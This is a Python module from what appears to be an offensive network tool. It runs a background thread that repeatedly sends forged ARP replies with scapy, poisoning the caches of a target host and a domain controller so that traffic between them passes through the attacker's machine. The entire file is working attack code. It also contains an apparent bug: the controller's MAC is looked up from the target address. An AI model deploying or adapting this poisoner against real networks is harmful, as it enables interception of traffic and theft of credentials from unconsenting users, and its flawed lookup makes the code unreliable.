#!/usr/bin/python3

import time
from scapy.all import sendp
from scapy.layers.l2 import Ether, ARP, arping

from ..core.parse_args import AxiomArgParser
from .StoppableThread import StoppableThread

def ARP_loop():
    i = 0
    args = AxiomArgParser.GetProgramArgs()

    if args is None or args.targets is None or args.targets is None:
        raise ValueError("[!] Unexpected value in args")

    while True:
        time.sleep(1)

        if Poisoner.POISONER_ARP.must_shutdown():
            return
        if i % 10 == 0:
            print("[REPOISONING]")
            victim_mac = Poisoner.GetMac(args.targets[0])
            dc_mac = Poisoner.GetMac(args.targets[0])

            p1 = Ether(dst=victim_mac) \
                / ARP(op="is-at", psrc=args.dcs[0], hwdst=victim_mac, hwsrc=args.source_mac, pdst=args.targets[0])
            p2 = Ether(dst=dc_mac) \
                / ARP(op="is-at", psrc=args.targets[0], hwdst=dc_mac, hwsrc=args.source_mac, pdst=args.dcs[0])
            sendp(p1, verbose=False, iface=args.iface)
            sendp(p2, verbose=False, iface=args.iface)
        i += 1

class Poisoner():
    POISONER_ARP: StoppableThread = None
    CACHED_MACS = {}

    def __init__(self):
        pass

    def Start(self):
        arp_poisoner = StoppableThread(target=ARP_loop, kwargs={})
        arp_poisoner.set_name('ARP POISONER')
        arp_poisoner.start()

        Poisoner.POISONER_ARP = arp_poisoner

    def Stop(self):
        Poisoner.POISONER_ARP.shutdown()

    @staticmethod
    def GetMac(ip: str):
        if ip not in Poisoner.CACHED_MACS:
            ans, uans = arping(ip, verbose=False)
            Poisoner.CACHED_MACS[ip] = ans[0][1][Ether].src

        return (Poisoner.CACHED_MACS[ip])

